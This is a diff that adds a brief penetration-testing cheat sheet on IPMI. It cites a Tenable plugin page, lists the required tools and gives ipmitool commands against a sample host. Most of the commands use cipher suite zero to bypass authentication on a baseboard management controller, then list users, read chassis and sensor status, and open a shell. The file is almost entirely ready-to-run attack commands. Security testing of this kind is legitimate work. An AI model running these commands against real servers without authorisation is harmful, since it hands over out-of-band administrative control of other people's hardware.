@@ -1,0 +1,17 @@
+# IPMI
+
+http://www.tenable.com/plugins/index.php?view=single&id=68931
+
+Tools required:
+ipmitool
+freeipmi-tools
+
+ipmitool -I lanplus -H 192.168.0.1 -U Administrator -P notapassword user list
+
+# Specifying Cipher Suite Zero
+ipmitool -I lanplus -C 0 -H 192.168.0.1 -U Administrator -P notapassword user list
+ipmitool -I lanplus -C 0 -H 192.168.0.1 -U Administrator -P notapassword chassis status
+ipmitool -I lanplus -C 0 -H 192.168.0.1 -U Administrator -P notapassword help
+ipmitool -I lanplus -C 0 -H 192.168.0.1 -U Administrator -P notapassword shell
+ipmitool -I lanplus -C 0 -H 192.168.0.1 -U Administrator -P notapassword sensor
+
